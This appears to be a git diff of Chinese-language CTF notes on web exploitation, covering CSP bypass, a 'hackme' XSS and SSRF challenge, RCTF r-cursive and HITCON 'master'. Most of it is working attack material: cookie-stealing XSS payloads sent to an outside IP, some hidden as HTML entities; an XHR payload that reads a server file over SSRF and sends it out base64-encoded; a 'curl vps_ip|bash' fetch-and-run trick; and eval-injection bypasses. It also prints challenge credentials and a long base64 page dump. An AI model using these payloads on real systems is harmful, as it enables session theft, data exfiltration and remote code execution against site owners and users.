@@ -2922,7 +2922,7 @@ raw 为 TRUE 时为 16 字符二进制格式，默认为 false 32 字符十六�
 	object-src	定义 \<applet>、\<embed>、\<object> 等引用资源加载策略
 	参考 https://hurricane618.me/2018/06/30/csp-bypass-summary/
 	
-	<link rel="prefetch" href="http://demo.wywwzjj.top:8001/?c=[cookie]"> 
+	<link rel="prefetch" href="http://47.101.220.241:9999/?c=[cookie]"> 
 	<link rel='preload' href='http://demo.wywwzjj.top/public/xss.js'>
 	<link rel='prefetch' href='http://demo.wywwzjj.top/public/xss.js?c=jdklfa'>
 	<link rel='prefetch' href='120.77.176.168:11122?c=jdklfa'>
@@ -2977,37 +2977,122 @@ raw 为 TRUE 时为 16 字符二进制格式，默认为 false 32 字符十六�
 
 
 #hackme xss
+	<img STYLE="background-image:url(http://47.101.220.241:9999)">
 
-	<img STYLE="background-image:url(javascript:alert('XSS'))">
-
-	<img STYLE="background-image:url(http://demo.wywwzjj.top:8001)">
-
-	http://demo.wywwzjj.top:8001
-
-
+	http://47.101.220.241:9999
 
 	<script>
-	document.location="http://demo.wywwzjj.top:8001?cookie="+document.cookie
-	new Image().src="http://demo.wywwzjj.top:8001?cookie="+document.cookie
+		document.location="http://47.101.220.241:9999?cookie="+document.cookie
+		new Image().src="http://47.101.220.241:9999?cookie="+document.cookie
 	</script>
-	<img src="http://demo.wywwzjj.top:8001?cookie="+document.cookie></img>
+	<img src="http://47.101.220.241:9999?cookie="+document.cookie></img>
 
-	<svg/onload="document.location='http://demo.wywwzjj.top:8001'">
+	<svg/onload="document.location='http://47.101.220.241:9999'">
 
+	<iframe src=http://47.101.220.241:9999 <
 
+	<svg/onload="javascript:document.location.href=('http://47.101.220.241:9999?cookie='+document.cookie)">
+
+	不区分大小写
 
 	<script
 	)
 	onmouseover
 	onload
+	onerror
 	onfocus
 	<iframe
+	
+	<svg/onload="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x6c;&#x6f;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x2e;&#x68;&#x72;&#x65;&#x66;&#x3d;&#x28;&#x27;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x34;&#x37;&#x2e;&#x31;&#x30;&#x31;&#x2e;&#x32;&#x32;&#x30;&#x2e;&#x32;&#x34;&#x31;&#x3a;&#x39;&#x39;&#x39;&#x39;&#x3f;&#x63;&#x6f;&#x6f;&#x6b;&#x69;&#x65;&#x3d;&#x27;&#x2b;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x63;&#x6f;&#x6f;&#x6b;&#x69;&#x65;&#x29;">
 
-	<svg/onload=document.location="http://demo.wywwzjj.top:8001?cookie="+document.url>
+	<svg/onload=document.location="http://47.101.220.241:9999?cookie="+document.url>
 	url --> undefinded
 	referer --> localhost/read.php
 
 	所以咱们可以看看 config.php 有什么内容
+
+
+	<!-- <?php 
+// database config 
+define('DB_USER', 'xssrf'); 
+define('DB_PASS', 'xssrfmeplz'); 
+define('DB_HOST', 'host=localhost'); 
+define('DB_NAME', 'xssrf'); 
+
+// redis config 
+define('REDIS_HOST', 'localhost'); 
+define('REDIS_PORT', 25566); 
+
+// define flag 
+define('FLAG', 'FLAG{curl -v -o flag --next flag://in-the.redis/the?port=25566&good=luck}'); 
+$c_hardness = 5; // how many proof of work leading zeros
+
+error_reporting(E_ALL ^ E_NOTICE); 
+session_start(); 
+require('config.php'); 
+$connection_string = sprintf('mysql:%s;dbname=%s;charset=utf8mb4', DB_HOST, DB_NAME); 
+$db = new PDO($connection_string, DB_USER, DB_PASS); 
+require('user_func.php'); 
+require('mail_func.php'); 
+require('waf_func.php'); 
+function redirect($url='index.php') { 
+    $url = (string)preg_replace('/[\r\n]+/', '', $url); 
+    header("Location: $url"); 
+} 
+
+function login_required() { 
+    if(!isset($_SESSION['user'])) { 
+        redirect('login.php?next=' . urlencode($_SERVER['REQUEST_URI'])); 
+        exit; 
+    } 
+}
+
+function admin_required() { 
+    login_required(); 
+    if($_SESSION['user']['is_admin'] !== '1') { 
+        $error_msg = 'Admin required'; 
+        require('error.php'); 
+        exit;
+    } 
+} 
+
+function h($str) { 
+    return htmlentities($str, ENT_QUOTES | ENT_HTML5); 
+} 
+
+if(isset($_SESSION['user'])) { 
+    $unread_count = count_unread_mail(); 
+    if($_SESSION['user']['is_admin']) { 
+        if($_SERVER['REMOTE_ADDR'] !== '127.0.0.1' && $_SERVER['REMOTE_ADDR'] !== '::1') {
+            $error_msg = 'Admin only allowed from localhost, but you came from ' . $_SERVER['REMOTE_ADDR']; 
+            require('error.php');
+            exit;
+        }
+    } 
+}
+?> -->
+<code> &lt;&quest;php&NewLine;error&lowbar;reporting&lpar;E&lowbar;ALL &Hat; E&lowbar;NOTICE&rpar;&semi;&NewLine;session&lowbar;start&lpar;&rpar;&semi;&NewLine;&NewLine;require&lpar;&apos;config&period;php&apos;&rpar;&semi;&NewLine;&NewLine;&dollar;connection&lowbar;string &equals; sprintf&lpar;&apos;mysql&colon;&percnt;s&semi;dbname&equals;&percnt;s&semi;charset&equals;utf8mb4&apos;&comma; DB&lowbar;HOST&comma; DB&lowbar;NAME&rpar;&semi;&NewLine;&dollar;db &equals; new PDO&lpar;&dollar;connection&lowbar;string&comma; DB&lowbar;USER&comma; DB&lowbar;PASS&rpar;&semi;&NewLine;&NewLine;require&lpar;&apos;user&lowbar;func&period;php&apos;&rpar;&semi;&NewLine;require&lpar;&apos;mail&lowbar;func&period;php&apos;&rpar;&semi;&NewLine;require&lpar;&apos;waf&lowbar;func&period;php&apos;&rpar;&semi;&NewLine;&NewLine;function redirect&lpar;&dollar;url&equals;&apos;index&period;php&apos;&rpar; &lbrace;&NewLine;    &dollar;url &equals; &lpar;string&rpar;preg&lowbar;replace&lpar;&apos;&sol;&lbrack;&bsol;r&bsol;n&rsqb;&plus;&sol;&apos;&comma; &apos;&apos;&comma; &dollar;url&rpar;&semi;&NewLine;    header&lpar;&quot;Location&colon; &dollar;url&quot;&rpar;&semi;&NewLine;&rcub;&NewLine;&NewLine;function login&lowbar;required&lpar;&rpar; &lbrace;&NewLine;    if&lpar;&excl;isset&lpar;&dollar;&lowbar;SESSION&lbrack;&apos;user&apos;&rsqb;&rpar;&rpar; &lbrace;&NewLine;        redirect&lpar;&apos;login&period;php&quest;next&equals;&apos; &period; urlencode&lpar;&dollar;&lowbar;SERVER&lbrack;&apos;REQUEST&lowbar;URI&apos;&rsqb;&rpar;&rpar;&semi;&NewLine;        exit&semi;&NewLine;    &rcub;&NewLine;&rcub;&NewLine;&NewLine;function admin&lowbar;required&lpar;&rpar; &lbrace;&NewLine;    login&lowbar;required&lpar;&rpar;&semi;&NewLine;    if&lpar;&dollar;&lowbar;SESSION&lbrack;&apos;user&apos;&rsqb;&lbrack;&apos;is&lowbar;admin&apos;&rsqb; &excl;&equals;&equals; &apos;1&apos;&rpar; &lbrace;&NewLine;        &dollar;error&lowbar;msg &equals; &apos;Admin required&apos;&semi;&NewLine;        require&lpar;&apos;error&period;php&apos;&rpar;&semi;&NewLine;        exit&semi;&NewLine;    &rcub;&NewLine;&rcub;&NewLine;&NewLine;function h&lpar;&dollar;str&rpar; &lbrace;&NewLine;    return htmlentities&lpar;&dollar;str&comma; ENT&lowbar;QUOTES &vert; ENT&lowbar;HTML5&rpar;&semi;&NewLine;&rcub;&NewLine;&NewLine;if&lpar;isset&lpar;&dollar;&lowbar;SESSION&lbrack;&apos;user&apos;&rsqb;&rpar;&rpar; &lbrace;&NewLine;    &dollar;unread&lowbar;count &equals; count&lowbar;unread&lowbar;mail&lpar;&rpar;&semi;&NewLine;&NewLine;    if&lpar;&dollar;&lowbar;SESSION&lbrack;&apos;user&apos;&rsqb;&lbrack;&apos;is&lowbar;admin&apos;&rsqb;&rpar; &lbrace;&NewLine;        if&lpar;&dollar;&lowbar;SERVER&lbrack;&apos;REMOTE&lowbar;ADDR&apos;&rsqb; &excl;&equals;&equals; &apos;127&period;0&period;0&period;1&apos; &amp;&amp; &dollar;&lowbar;SERVER&lbrack;&apos;REMOTE&lowbar;ADDR&apos;&rsqb; &excl;&equals;&equals; &apos;&colon;&colon;1&apos;&rpar; &lbrace;&NewLine;            &dollar;error&lowbar;msg &equals; &apos;Admin only allowed from localhost&comma; but you came from &apos; &period; &dollar;&lowbar;SERVER&lbrack;&apos;REMOTE&lowbar;ADDR&apos;&rsqb;&semi;&NewLine;            require&lpar;&apos;error&period;php&apos;&rpar;&semi;&NewLine;            exit&semi;&NewLine;        &rcub;&NewLine;    &rcub;&NewLine;&rcub;&NewLine;</code></pre>
+
+<svg/onload="
+var x=new XMLHttpRequest();
+x.onreadystatechange=function() {
+    if (x.readyState==4 && x.status==200) {
+        document.location='http://47.101.220.241:9999/?code='+btoa(x.responseText);
+    }
+}
+x.open("POST","request.php",true);
+x.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+x.send("url=file:///var/www/html/request.php");
+">
+
+
+<svg/onload="
+&#x76;&#x61;&#x72;&#x20;&#x78;&#x3d;&#x6e;&#x65;&#x77;&#x20;&#x58;&#x4d;&#x4c;&#x48;&#x74;&#x74;&#x70;&#x52;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x28;&#x29;&#x3b;&#x0a;&#x78;&#x2e;&#x6f;&#x6e;&#x72;&#x65;&#x61;&#x64;&#x79;&#x73;&#x74;&#x61;&#x74;&#x65;&#x63;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x3d;&#x66;&#x75;&#x6e;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x28;&#x29;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x69;&#x66;&#x20;&#x28;&#x78;&#x2e;&#x72;&#x65;&#x61;&#x64;&#x79;&#x53;&#x74;&#x61;&#x74;&#x65;&#x3d;&#x3d;&#x34;&#x20;&#x26;&#x26;&#x20;&#x78;&#x2e;&#x73;&#x74;&#x61;&#x74;&#x75;&#x73;&#x3d;&#x3d;&#x32;&#x30;&#x30;&#x29;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x6c;&#x6f;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x3d;&#x27;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x34;&#x37;&#x2e;&#x31;&#x30;&#x31;&#x2e;&#x32;&#x32;&#x30;&#x2e;&#x32;&#x34;&#x31;&#x3a;&#x39;&#x39;&#x39;&#x39;&#x2f;&#x3f;&#x63;&#x6f;&#x64;&#x65;&#x3d;&#x27;&#x2b;&#x62;&#x74;&#x6f;&#x61;&#x28;&#x78;&#x2e;&#x72;&#x65;&#x73;&#x70;&#x6f;&#x6e;&#x73;&#x65;&#x54;&#x65;&#x78;&#x74;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x7d;&#x0a;&#x78;&#x2e;&#x6f;&#x70;&#x65;&#x6e;&#x28;&#x22;&#x50;&#x4f;&#x53;&#x54;&#x22;&#x2c;&#x22;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x70;&#x68;&#x70;&#x22;&#x2c;&#x74;&#x72;&#x75;&#x65;&#x29;&#x3b;&#x0a;&#x78;&#x2e;&#x73;&#x65;&#x74;&#x52;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x48;&#x65;&#x61;&#x64;&#x65;&#x72;&#x28;&#x22;&#x43;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x2d;&#x74;&#x79;&#x70;&#x65;&#x22;&#x2c;&#x22;&#x61;&#x70;&#x70;&#x6c;&#x69;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x2f;&#x78;&#x2d;&#x77;&#x77;&#x77;&#x2d;&#x66;&#x6f;&#x72;&#x6d;&#x2d;&#x75;&#x72;&#x6c;&#x65;&#x6e;&#x63;&#x6f;&#x64;&#x65;&#x64;&#x22;&#x29;&#x3b;&#x0a;&#x78;&#x2e;&#x73;&#x65;&#x6e;&#x64;&#x28;&#x22;&#x75;&#x72;&#x6c;&#x3d;&#x66;&#x69;&#x6c;&#x65;&#x3a;&#x2f;&#x2f;&#x2f;&#x76;&#x61;&#x72;&#x2f;&#x77;&#x77;&#x77;&#x2f;&#x68;&#x74;&#x6d;&#x6c;&#x2f;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x70;&#x68;&#x70;&#x22;&#x29;&#x3b;
+">
+
+
+
+PCFET0NUWVBFIGh0bWw CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICAgIDx0aXRsZT5YU1NSRiAtIFJlcXVlc3Q8L3RpdGxlPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJib290c3RyYXAvY3NzL2Jvb3RzdHJhcC5taW4uY3NzIiBtZWRpYT0iYWxsIj4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0ic3R5bGUuY3NzIiBtZWRpYT0iYWxsIj4KICAgIDxzdHlsZT5wcmUgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjZWVlOyBwYWRkaW5nOiA1cHg7IH08L3N0eWxlPgogIDwvaGVhZD4KICA8Ym9keT4KPG5hdiBjbGFzcz0ibmF2YmFyIG5hdmJhci1leHBhbmQtbGcgbmF2YmFyLWRhcmsgYmctZGFyayBkLWZsZXgiPgogIDxhIGNsYXNzPSJuYXZiYXItYnJhbmQiIGhyZWY9ImluZGV4LnBocCI WFNTUkY8L2E CgogIDx1bCBjbGFzcz0ibmF2YmFyLW5hdiI CiAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj4KICAgICAgPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSJzZW5kbWFpbC5waHAiPlNlbmQgTWFpbDwvYT4KICAgIDwvbGk CiAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj4KICAgICAgPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSJtYWlsYm94LnBocCI TWFpbGJveDwvYT4KICAgIDwvbGk CiAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj4KICAgICAgPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSJzZW50bWFpbC5waHAiPlNlbnQgTWFpbDwvYT4KICAgIDwvbGk CiAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj4KICAgICAgPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSJzZXRhZG1pbi5waHAiPlNldCBBZG1pbjwvYT4KICAgIDwvbGk CiAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj4KICAgICAgPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSJyZXF1ZXN0LnBocCI U2VuZCBSZXF1ZXN0PC9hPgogICAgPC9saT4KICA8L3VsPgoKICA8dWwgY2xhc3M9Im5hdmJhci1uYXYgbWwtYXV0byI CiAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj4KICAgICAgPHNwYW4gY2xhc3M9Im5hdmJhci10ZXh0Ij5IZWxsbywgYWRtaW4gKEFkbWluaXN0cmF0b3IpPC9zcGFuPgogICAgPC9saT4KICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPgogICAgICA8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9ImxvZ291dC5waHAiPkxvZ291dDwvYT4KICAgIDwvbGk CiAgPC91bD4KPC9uYXY CgogICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCiAgICAgIDxwcmU PGNvZGU Jmx0OyZxdWVzdDtwaHAgcmVxdWlyZSZscGFyOyZhcG9zO2NvbW1vbiZwZXJpb2Q7cGhwJmFwb3M7JnJwYXI7JnNlbWk7Jk5ld0xpbmU7YWRtaW4mbG93YmFyO3JlcXVpcmVkJmxwYXI7JnJwYXI7JnNlbWk7Jk5ld0xpbmU7Jk5ld0xpbmU7JmRvbGxhcjttc2cgJmVxdWFsczsgJmxicmFjazsmcnNxYjsmc2VtaTsmTmV3TGluZTsmZG9sbGFyO3VybCAmZXF1YWxzOyAmYXBvczsmYXBvczsmc2VtaTsmTmV3TGluZTsmZG9sbGFyO3Jlc3VsdCAmZXF1YWxzOyAmYXBvczsmYXBvczsmc2VtaTsmTmV3TGluZTsmTmV3TGluZTtpZiZscGFyO2lzc2V0JmxwYXI7JmRvbGxhcjsmbG93YmFyO1BPU1QmbGJyYWNrOyZhcG9zO3VybCZhcG9zOyZyc3FiOyZycGFyOyZycGFyOyAmbGJyYWNlOyZOZXdMaW5lOyAgICAmZG9sbGFyO3VybCAmZXF1YWxzOyAmZG9sbGFyOyZsb3diYXI7UE9TVCZsYnJhY2s7JmFwb3M7dXJsJmFwb3M7JnJzcWI7JnNlbWk7Jk5ld0xpbmU7ICAgICZkb2xsYXI7cmVzdWx0ICZlcXVhbHM7IHNoZWxsJmxvd2JhcjtleGVjJmxwYXI7JmFwb3M7Y3VybCAtbSAxIC0tY29ubmVjdC10aW1lb3V0IDEgLXMgJmFwb3M7ICZwZXJpb2Q7IGVzY2FwZXNoZWxsYXJnJmxwYXI7JmRvbGxhcjt1cmwmcnBhcjsmcnBhcjsmc2VtaTsmTmV3TGluZTsmcmN1YjsmTmV3TGluZTsmcXVlc3Q7Jmd0OyZsdDsmZXhjbDtET0NUWVBFIGh0bWwmZ3Q7Jk5ld0xpbmU7Jmx0O2h0bWwgbGFuZyZlcXVhbHM7JnF1b3Q7ZW4mcXVvdDsmZ3Q7Jk5ld0xpbmU7ICAmbHQ7aGVhZCZndDsmTmV3TGluZTsgICAgJmx0O21ldGEgY2hhcnNldCZlcXVhbHM7JnF1b3Q7VVRGLTgmcXVvdDsmZ3Q7Jk5ld0xpbmU7ICAgICZsdDt0aXRsZSZndDtYU1NSRiAtIFJlcXVlc3QmbHQ7JnNvbDt0aXRsZSZndDsmTmV3TGluZTsgICAgJmx0O2xpbmsgcmVsJmVxdWFsczsmcXVvdDtzdHlsZXNoZWV0JnF1b3Q7IGhyZWYmZXF1YWxzOyZxdW90O2Jvb3RzdHJhcCZzb2w7Y3NzJnNvbDtib290c3RyYXAmcGVyaW9kO21pbiZwZXJpb2Q7Y3NzJnF1b3Q7IG1lZGlhJmVxdWFsczsmcXVvdDthbGwmcXVvdDsmZ3Q7Jk5ld0xpbmU7ICAgICZsdDtsaW5rIHJlbCZlcXVhbHM7JnF1b3Q7c3R5bGVzaGVldCZxdW90OyBocmVmJmVxdWFsczsmcXVvdDtzdHlsZSZwZXJpb2Q7Y3NzJnF1b3Q7IG1lZGlhJmVxdWFsczsmcXVvdDthbGwmcXVvdDsmZ3Q7Jk5ld0xpbmU7ICAgICZsdDtzdHlsZSZndDtwcmUgJmxicmFjZTsgYmFja2dyb3VuZC1jb2xvciZjb2xvbjsgJm51bTtlZWUmc2VtaTsgcGFkZGluZyZjb2xvbjsgNXB4JnNlbWk7ICZyY3ViOyZsdDsmc29sO3N0eWxlJmd0OyZOZXdMaW5lOyAgJmx0OyZzb2w7aGVhZCZndDsmTmV3TGluZTsgICZsdDtib2R5Jmd0OyZOZXdMaW5lOyZsdDsmcXVlc3Q7cGhwIHJlcXVpcmUmbHBhcjsmYXBvcztuYXYmcGVyaW9kO3BocCZhcG9zOyZycGFyOyZzZW1pOyAmcXVlc3Q7Jmd0OyZOZXdMaW5lOyZOZXdMaW5lOyAgICAmbHQ7ZGl2IGNsYXNzJmVxdWFsczsmcXVvdDtjb250YWluZXImcXVvdDsmZ3Q7Jk5ld0xpbmU7Jmx0OyZxdWVzdDtwaHAgZm9yZWFjaCZscGFyOyZkb2xsYXI7bXNnIGFzIGxpc3QmbHBhcjsmZG9sbGFyO3R5cGUmY29tbWE7ICZkb2xsYXI7Y29udGVudCZycGFyOyZycGFyOyZjb2xvbjsgJnF1ZXN0OyZndDsmTmV3TGluZTsgICAgICAmbHQ7ZGl2IGNsYXNzJmVxdWFsczsmcXVvdDthbGVydCBhbGVydC0mbHQ7JnF1ZXN0OyZlcXVhbHM7JmRvbGxhcjt0eXBlJnNlbWk7JnF1ZXN0OyZndDsmcXVvdDsmZ3Q7Jmx0OyZxdWVzdDsmZXF1YWxzOyZkb2xsYXI7Y29udGVudCZzZW1pOyZxdWVzdDsmZ3Q7Jmx0OyZzb2w7ZGl2Jmd0OyZOZXdMaW5lOyZsdDsmcXVlc3Q7cGhwIGVuZGZvcmVhY2gmc2VtaTsgJnF1ZXN0OyZndDsmTmV3TGluZTsmTmV3TGluZTsmbHQ7JnF1ZXN0O3BocCBpZiZscGFyOyZkb2xsYXI7cmVzdWx0JnJwYXI7JmNvbG9uOyAmcXVlc3Q7Jmd0OyZOZXdMaW5lOyAgICAgICZsdDtwcmUmZ3Q7Jmx0O2NvZGUmZ3Q7Jmx0OyZxdWVzdDsmZXF1YWxzO2gmbHBhcjsmZG9sbGFyO3Jlc3VsdCZycGFyOyZxdWVzdDsmZ3Q7Jmx0OyZzb2w7Y29kZSZndDsmbHQ7JnNvbDtwcmUmZ3Q7Jk5ld0xpbmU7Jmx0OyZxdWVzdDtwaHAgZW5kaWYmc2VtaTsgJnF1ZXN0OyZndDsmTmV3TGluZTsmTmV3TGluZTsgICAgICAmbHQ7Zm9ybSBhY3Rpb24mZXF1YWxzOyZxdW90OyZsdDsmcXVlc3Q7JmVxdWFsczsmZG9sbGFyOyZsb3diYXI7U0VSVkVSJmxicmFjazsmYXBvcztSRVFVRVNUJmxvd2JhcjtVUkkmYXBvczsmcnNxYjsmcXVlc3Q7Jmd0OyZxdW90OyBtZXRob2QmZXF1YWxzOyZxdW90O1BPU1QmcXVvdDsmZ3Q7Jk5ld0xpbmU7ICAgICAgICAmbHQ7ZGl2IGNsYXNzJmVxdWFsczsmcXVvdDtmb3JtLWdyb3VwJnF1b3Q7Jmd0OyZOZXdMaW5lOyAgICAgICAgICAmbHQ7bGFiZWwgZm9yJmVxdWFsczsmcXVvdDt1cmwmcXVvdDsmZ3Q7VVJMJmx0OyZzb2w7bGFiZWwmZ3Q7Jk5ld0xpbmU7ICAgICAgICAgICZsdDt0ZXh0YXJlYSBuYW1lJmVxdWFsczsmcXVvdDt1cmwmcXVvdDsgY2xhc3MmZXF1YWxzOyZxdW90O2Zvcm0tY29udHJvbCZxdW90OyBpZCZlcXVhbHM7JnF1b3Q7dXJsJnF1b3Q7IGFyaWEtZGVzY3JpYmVkYnkmZXF1YWxzOyZxdW90O3VybCZxdW90OyBwbGFjZWhvbGRlciZlcXVhbHM7JnF1b3Q7VVJMJnF1b3Q7IHJvd3MmZXF1YWxzOyZxdW90OzEwJnF1b3Q7Jmd0OyZsdDsmcXVlc3Q7JmVxdWFsczsmZG9sbGFyO3VybCZxdWVzdDsmZ3Q7Jmx0OyZzb2w7dGV4dGFyZWEmZ3Q7Jk5ld0xpbmU7ICAgICAgICAmbHQ7JnNvbDtkaXYmZ3Q7Jk5ld0xpbmU7Jk5ld0xpbmU7ICAgICAgICAmbHQ7YnV0dG9uIGNsYXNzJmVxdWFsczsmcXVvdDtidG4gYnRuLXByaW1hcnkmcXVvdDsmZ3Q7U2VuZCBSZXF1ZXN0Jmx0OyZzb2w7YnV0dG9uJmd0OyZOZXdMaW5lOyAgICAgICZsdDsmc29sO2Zvcm0mZ3Q7Jk5ld0xpbmU7ICAgICZsdDsmc29sO2RpdiZndDsmTmV3TGluZTsgICZsdDsmc29sO2JvZHkmZ3Q7Jk5ld0xpbmU7Jmx0OyZzb2w7aHRtbCZndDsmTmV3TGluZTs8L2NvZGU PC9wcmU CgogICAgICA8Zm9ybSBhY3Rpb249Ii9yZXF1ZXN0LnBocCIgbWV0aG9kPSJQT1NUIj4KICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj4KICAgICAgICAgIDxsYWJlbCBmb3I9InVybCI VVJMPC9sYWJlbD4KICAgICAgICAgIDx0ZXh0YXJlYSBuYW1lPSJ1cmwiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIGlkPSJ1cmwiIGFyaWEtZGVzY3JpYmVkYnk9InVybCIgcGxhY2Vob2xkZXI9IlVSTCIgcm93cz0iMTAiPmZpbGU6Ly8vdmFyL3d3dy9odG1sL3JlcXVlc3QucGhwPC90ZXh0YXJlYT4KICAgICAgICA8L2Rpdj4KCiAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5Ij5TZW5kIFJlcXVlc3Q8L2J1dHRvbj4KICAgICAgPC9mb3JtPgogICAgPC9kaXY CiAgPC9ib2R5Pgo8L2h0bWw Cg==
 
 
 
@@ -3218,14 +3303,18 @@ raw 为 TRUE 时为 16 字符二进制格式，默认为 false 32 字符十六�
 
 
 # 2018-RCTF r-cursive
-<?php
-sha1($_SERVER['REMOTE_ADDR']) === 'f6e5575f93a408c5cb709c73eaa822cb09b4d0f7' ?: die();
-';' === preg_replace('/[^\W_]+\((?R)?\)/', NULL, $_GET['cmd']) ? eval($_GET['cmd']) : show_source(__FILE__);
+	<?php
+	sha1($_SERVER['REMOTE_ADDR']) === 'f6e5575f93a408c5cb709c73eaa822cb09b4d0f7' ?: die();
+	';' === preg_replace('/[^\W_]+\((?R)?\)/', NULL, $_GET['cmd']) ? eval($_GET['cmd']) : show_source(__FILE__);
 
-这个绕过有点牛逼：curl "http://xxxx.sandbox.r-cursive.ml:1337/?cmd=eval(next(getallheaders()));" -H "User-Agent: phpinfo();" -H "Accept: asdasd/asdasda"
+	这个绕过有点牛逼：curl "http://xxxx.sandbox.r-cursive.ml:1337/?cmd=eval(next(getallheaders()));" -H "User-Agent: phpinfo();" -H "Accept: asdasd/asdasda"
 
-(PHP 4 >= 4.0.4, PHP 5, PHP 7)
-get_defined_vars — 返回由所有已定义变量所组成的数组
+	(PHP 4 >= 4.0.4, PHP 5, PHP 7)
+	nginx
+	get_defined_vars() — 返回由所有已定义变量所组成的数组
+
+	apache
+	getallheaders()
 
 
 
@@ -3484,7 +3573,7 @@ get_defined_vars — 返回由所有已定义变量所组成的数组
 		'>\>g', 
 		'ls>>_', 
 
-		# generate `curl orange.tw|python`
+		# generate `curl vps_ip|bash`
 		'>sh\ ', 
 		'>ba\\',
 		'>\|\\', 
@@ -3519,6 +3608,169 @@ get_defined_vars — 返回由所有已定义变量所组成的数组
 	这还有个版本 v2，长度限制到 4，另外 py 脚本反弹shell不太靠谱，最好用bash
 
 
+# 2017 hitcon ctf master
+	<?php
+	$FLAG = create_function("", 'die(`/read_flag`);');
+	$SECRET = `/read_secret`;
+	$SANDBOX = "/var/www/data/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);
+	@mkdir($SANDBOX);
+	@chdir($SANDBOX);
+
+	if (!isset($_COOKIE["session-data"])) {
+		$data = serialize(new User($SANDBOX));
+		$hmac = hash_hmac("sha1", $data, $SECRET);
+		setcookie("session-data", sprintf("%s-----%s", $data, $hmac));
+	}
+
+	class User {
+		public $avatar;
+		function __construct($path) {
+			$this->avatar = $path;
+		}
+	}
+
+	// 猜测执行 FLAG() 出 flag
+	class Admin extends User {
+		function __destruct() {
+			$random = bin2hex(openssl_random_pseudo_bytes(32));
+			eval("function my_function_$random() {"
+				. "  global \$FLAG; \$FLAG();"
+				. "}");
+			// 难道要爆破？
+			$_GET["lucky"]();
+		}
+	}
+
+	function check_session() {
+		global $SECRET;
+		$data = $_COOKIE["session-data"];
+		list($data, $hmac) = explode("-----", $data, 2);
+		if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac)) {
+			die("Bye");
+		}
+
+		if (!hash_equals(hash_hmac("sha1", $data, $SECRET), $hmac)) {
+			die("Bye Bye");
+		}
+
+		// 反序列化点，但无法更改 session 的值
+		$data = unserialize($data);
+		if (!isset($data->avatar)) {
+			die("Bye Bye Bye");
+		}
+
+		return $data->avatar;
+	}
+
+	function upload($path) {
+		// vps 准备好 phar 文件
+		$data = file_get_contents($_GET["url"] . "/avatar.gif");
+		if (substr($data, 0, 6) !== "GIF89a") {
+			die("Fuck off");
+		}
+
+		file_put_contents($path . "/avatar.gif", $data);
+		die("Upload OK");
+	}
+
+	function show($path) {
+		// 这两个函数都将造成反序列化
+		if (!file_exists($path . "/avatar.gif")) {
+			$path = "/var/www/html";
+		}
+
+		header("Content-Type: image/gif");
+		die(file_get_contents($path . "/avatar.gif"));
+	}
+
+	$mode = $_GET["m"];
+	if ($mode == "upload") {
+		upload(check_session());
+	} else if ($mode == "show") {
+		show(check_session());
+	} else {
+		highlight_file(__FILE__);
+	}
+
+	思路变为，先上传一个 phar 文件，然后调用相关文件操作函数，造成反序列化
+	可惜仅仅反序列化，是不行的，还需要调用 flag()，eval 里的函数名又是随机值，爆破个毛线
+	这里有了一个新的知识点，匿名函数其实还有另一个名字 \x00lambda_%d
+
+	zend_builtin_functions.c
+	do {
+		ZSTR_LEN(function_name) = snprintf(ZSTR_VAL(function_name) + 1, sizeof("lambda_")+MAX_LENGTH_OF_LONG, "lambda_%d", ++EG(lambda_count)) + 1;
+	} while (zend_hash_add_ptr(EG(function_table), function_name, func) == NULL);
+	RETURN_NEW_STR(function_name);
+
+	// 做个简单实验
+	<?php
+	create_function("", 'echo __FUNCTION__;');
+	call_user_func("\x00lambda_1", 1);
+
